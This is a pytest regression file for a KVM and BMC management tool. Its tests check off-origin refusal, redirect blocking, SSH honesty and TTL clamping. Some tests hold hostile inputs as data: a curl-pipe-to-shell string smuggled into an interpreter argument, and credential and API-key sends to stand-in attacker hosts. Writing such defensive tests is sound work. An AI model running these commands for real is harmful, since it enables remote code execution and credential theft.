"""Regressions for the 2026-08-03 whole-project review findings (#243).

Each test names the defect it pins. They live together because the fixes span
unrelated modules but share one origin; a reader chasing #243 finds the whole
set in one place.
"""

from __future__ import annotations

import math
import os
import threading
import urllib.error
import urllib.request

import pytest

from kvm_pilot.errors import KVMPilotError, VisionError
from kvm_pilot.safety import DESTRUCTIVE_OPS, EffectClass, effect_of

# -- health: the volatile/cacheable split must not hide findings -----------


def test_every_noncacheable_check_is_classified_volatile():
    """A check emitting cacheable=False results but classified 'stable' has its
    findings dropped by store_stable AND skipped on a warm cache — so a CRITICAL
    (amt-provisioning) vanished exactly when preflight gated a destructive op."""
    import inspect
    import re

    from kvm_pilot import health

    src = inspect.getsource(health)
    emits_noncacheable = {
        m.group(1)
        for m in re.finditer(r"def (check_\w+)\(.*?(?=\ndef |\Z)", src, re.S)
        if "cacheable=False" in m.group(0)
    }
    assert emits_noncacheable, "sanity: some checks must emit cacheable=False"
    misclassified = {
        name for name in emits_noncacheable
        if not health._is_volatile(getattr(health, name))
    }
    assert not misclassified, (
        f"{sorted(misclassified)} emit cacheable=False but are classified stable — "
        "their findings will disappear on a warm-cache preflight (#243)"
    )


def test_warm_cache_preflight_still_reports_hid_reachable(tmp_path):
    from kvm_pilot.health import HealthCache, preflight

    def stub_driver():
        class _D:
            host = "h"

            def get_info(self):
                return {}

            def get_firmware_info(self):
                return {"version": "1.0", "model": "M"}

            def get_hid_state(self):
                return {"online": True, "busy": False, "connected": True}

            def supports(self, _cap):
                return False

        return _D()

    cache = HealthCache(tmp_path / "hc.json")
    first = preflight(stub_driver(), cache=cache)
    warm = preflight(stub_driver(), cache=cache)
    assert "hid-reachable" in {r.id for r in first.results}
    assert "hid-reachable" in {r.id for r in warm.results}, (
        "hid-reachable vanished from the warm-cache report (#243)"
    )


# -- safety: AMT virtual media rides the MEDIA gate ------------------------


def test_amt_virtual_media_is_a_media_effect():
    # An operator granting ALLOW_MEDIA must cover AMT IDE-R; CONFIG_MUTATION
    # both over- and under-authorized it.
    assert effect_of("amt.mount_iso") is EffectClass.MEDIA
    assert effect_of("amt.eject") is EffectClass.MEDIA
    assert "amt.mount_iso" in DESTRUCTIVE_OPS and "amt.eject" in DESTRUCTIVE_OPS


# -- mcp/act: a non-finite TTL must not disable expiry ---------------------


@pytest.mark.parametrize("raw", ["nan", "NaN", "inf", "-inf"])
def test_non_finite_receipt_ttl_falls_back_to_default(monkeypatch, raw):
    from kvm_pilot.mcp import act

    monkeypatch.setenv("KVM_PILOT_MCP_RECEIPT_TTL", raw)
    ttl = act._receipt_ttl()
    assert math.isfinite(ttl) and ttl == 60.0, "nan/inf slipped through the clamp (#243)"


@pytest.mark.parametrize("raw", ["nan", "inf"])
def test_non_finite_standing_ttl_disables_standing_grants(monkeypatch, raw):
    from kvm_pilot.mcp import act

    monkeypatch.setenv("KVM_PILOT_MCP_STANDING_TTL", raw)
    assert act._standing_ceiling_min() == 0.0
    assert act.standing_enabled() is False


def test_sdk_symbols_come_from_the_shim():
    # #241's rule is one import site for SDK surface; act.py reached into
    # mcp.types directly, which the AST guard didn't cover.
    from kvm_pilot.mcp import _sdk

    assert hasattr(_sdk, "ClientCapabilities")
    assert hasattr(_sdk, "ElicitationCapability")


# -- redfish transport: off-origin refusal + session hygiene ---------------


def test_off_origin_url_is_refused_before_the_request(monkeypatch):
    from kvm_pilot.drivers.redfish.transport import RedfishHTTP

    http = RedfishHTTP("bmc.local", "root", "calvin", auth="basic")
    sent: list[str] = []
    monkeypatch.setattr(
        http._opener, "open",
        lambda *a, **k: sent.append("sent") or pytest.fail("request left the process"),
    )
    with pytest.raises(KVMPilotError, match="off-origin"):
        http.request("POST", "https://evil.example/redfish/v1/SessionService/Sessions",
                     json_body={"UserName": "root", "Password": "calvin"}, authed=False)
    assert not sent


def test_password_change_required_deletes_the_session(emu):
    """The session WAS created; raising before recording the token leaked a BMC
    session slot on every login attempt against such an account."""
    from kvm_pilot.drivers.redfish.transport import RedfishHTTP

    emu.state.password_change_required = True
    http = RedfishHTTP("127.0.0.1", emu.state.expected_user, emu.state.expected_passwd,
                       port=emu.port, scheme="http")
    with pytest.raises(KVMPilotError, match="password change"):
        http.login()
    assert http._token is None  # logout() ran and cleared it
    assert emu.state.session_deleted, "the created session was never DELETEd (#243)"


# -- ssh: honest reboot + no leaked askpass helper -------------------------


def test_appliance_reboot_reports_a_failed_ssh_command(monkeypatch):
    import subprocess
    import types

    from kvm_pilot import ssh as ssh_mod
    from kvm_pilot.safety import SafetyPolicy
    from kvm_pilot.ssh import ApplianceChannel

    ch = ApplianceChannel("10.0.0.9", key="/dev/null",
                          safety=SafetyPolicy(confirm=lambda *_: True))
    monkeypatch.setattr(ssh_mod.shutil, "which", lambda _n: "/usr/bin/ssh")
    monkeypatch.setattr(
        subprocess, "run",
        lambda *a, **k: types.SimpleNamespace(
            returncode=255, stdout="", stderr="Permission denied (publickey)."),
    )
    out = ch.reboot()
    assert out["ok"] is False, "a refused ssh reported 'rebooting' (#243)"
    assert "Permission denied" in out["stderr"]


def test_askpass_helper_is_removed_when_close_is_never_called():
    import gc

    from kvm_pilot.ssh import SSHChannel

    ch = SSHChannel("10.0.0.9", user="u", password="pw")
    path = ch._askpass_helper()
    assert os.path.exists(path)
    del ch
    gc.collect()
    assert not os.path.exists(path), "askpass helper leaked without close() (#243)"


def test_remote_powershell_rejects_an_arbitrary_interpreter():
    from kvm_pilot.remote_ps import RemotePowerShell
    from kvm_pilot.ssh import SSHChannel

    ch = SSHChannel("10.0.0.9", user="u", key="/dev/null")
    RemotePowerShell(ch, shell="pwsh")  # allowed
    with pytest.raises(ValueError, match="powershell"):
        RemotePowerShell(ch, shell="sh -c 'curl evil|sh' #")


# -- vision: no key-forwarding redirects, honest media type ----------------


def test_vision_transport_refuses_a_redirect(monkeypatch):
    from kvm_pilot.vision import base

    def boom(*_a, **_k):
        raise urllib.error.HTTPError(
            "https://api.example/v1", 302, "Found",
            {"Location": "http://attacker.example/collect"}, None,  # type: ignore[arg-type]
        )

    monkeypatch.setattr(base._OPENER, "open", boom)
    with pytest.raises(VisionError, match="never forwards"):
        base.request_json("POST", "https://api.example/v1",
                          headers={"x-api-key": "sk-secret"}, timeout=1.0, payload={})


def test_vision_transport_installs_a_no_redirect_opener():
    from kvm_pilot.vision.base import _OPENER, _NoRedirect

    assert any(isinstance(h, _NoRedirect) for h in _OPENER.handlers)
    assert _NoRedirect().redirect_request(None, None, 302, "", {}, "http://x") is None


def test_media_type_follows_the_image_bytes():
    import base64

    from kvm_pilot.vision.base import media_type_of_b64

    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"\0" * 32).decode()
    jpeg = base64.b64encode(b"\xff\xd8\xff\xe0" + b"\0" * 32).decode()
    # AMT snapshots PNG; declaring it JPEG makes the API reject the request.
    assert media_type_of_b64(png) == "image/png"
    assert media_type_of_b64(jpeg) == "image/jpeg"


def test_openai_compat_does_not_ship_the_env_key_to_a_local_server(monkeypatch):
    from kvm_pilot.vision.openai_compat import OpenAICompatBackend

    monkeypatch.setenv("OPENAI_API_KEY", "sk-real-credential")
    local = OpenAICompatBackend(base_url="http://127.0.0.1:1234/v1", model="m")
    assert local._api_key == "not-needed"
    real = OpenAICompatBackend(base_url="https://api.openai.com/v1", model="m")
    assert real._api_key == "sk-real-credential"


def test_unknown_vision_backend_raises_visionerror():
    from kvm_pilot.vision import make_backend

    with pytest.raises(VisionError, match="Unknown vision backend"):
        make_backend("nosuchbackend")


# -- driver honesty ---------------------------------------------------------


def test_amt_get_info_reports_unknown_power_as_none(amt_emu, monkeypatch):
    from kvm_pilot.drivers.amt import AmtDriver

    drv = AmtDriver("127.0.0.1", "admin", "secret", port=amt_emu.port,
                    confirm=lambda *_: True)
    monkeypatch.setattr(
        drv, "is_powered_on", lambda: (_ for _ in ()).throw(KVMPilotError("ME timed out")))
    assert drv.get_info()["power_state"] is None, "a failed power read reported 'off' (#243)"


def test_ipmi_boot_target_round_trips(monkeypatch):
    # get_boot_options() reported "usb" for the BMC's floppy selector while
    # set_boot_device("usb") rejected it — a read-then-write always failed.
    import types

    from kvm_pilot.drivers import ipmi as ipmi_mod
    from kvm_pilot.drivers.ipmi import _BOOT_SELECTOR_REVERSE, _BOOTDEV_MAP, IpmiDriver

    for _phrase, token in _BOOT_SELECTOR_REVERSE:
        assert token in _BOOTDEV_MAP, f"{token!r} is readable but not writable (#243)"

    sent: list[list[str]] = []
    monkeypatch.setattr(ipmi_mod.shutil, "which", lambda _n: "/usr/bin/ipmitool")
    monkeypatch.setattr(
        ipmi_mod.subprocess, "run",
        lambda argv, **kw: (sent.append(argv),
                            types.SimpleNamespace(returncode=0, stdout="", stderr=""))[1],
    )
    drv = IpmiDriver("10.0.1.99", "root", "calvin", confirm=lambda *a: True)
    drv.set_boot_device("floppy")  # the readable token must also be settable
    assert any("floppy" in " ".join(argv) for argv in sent)


def test_ider_stop_joins_the_serving_thread():
    import inspect

    from kvm_pilot.drivers.amt import ider

    src = inspect.getsource(ider.IderSession.stop)
    assert "join" in src, "stop() closes the ISO under the serving thread (#243)"
    assert src.index("join") < src.index("self._iso.close()"), (
        "the serving thread must be joined BEFORE the ISO file is closed (#243)"
    )


def test_fake_driver_msd_state_is_initialized():
    from kvm_pilot.drivers.fake import FakeDriver

    assert FakeDriver("h").msd_attached is False


# -- test-report harness: failures are data, not crashes ------------------


def test_power_probe_records_a_failed_read_as_a_row():
    from kvm_pilot.test_report import probe_power

    class Flaky:
        def is_powered_on(self):
            raise KVMPilotError("power read unsupported")

        def power_off(self):
            pass

        def power_on(self):
            pass

    row = probe_power(Flaky())  # must not propagate
    assert row["passed"] is False and "power read" in row["outcome"]


def test_virtual_media_probe_records_a_failed_state_read():
    from kvm_pilot.test_report import probe_virtual_media

    class Flaky:
        def mount_iso(self, _src):
            return "x.iso"

        def get_msd_state(self):
            raise KVMPilotError("msd state unavailable")

    row = probe_virtual_media(Flaky(), "x.iso")
    assert row["passed"] is False and "MSD state" in row["outcome"]


# -- router ---------------------------------------------------------------


def test_scorecard_saves_to_a_bare_filename(tmp_path, monkeypatch):
    from kvm_pilot.router import Scorecard, save_scorecard

    monkeypatch.chdir(tmp_path)
    card = Scorecard(host="h", driver="glkvm", firmware=None, results=[])
    out = save_scorecard(card, "scorecard.json")
    assert os.path.exists(out)


def test_threading_import_is_available_to_ider():
    # stop()'s current-thread guard needs it; a missing import would only fail
    # at teardown time on real hardware.
    from kvm_pilot.drivers.amt import ider

    assert ider.threading is threading
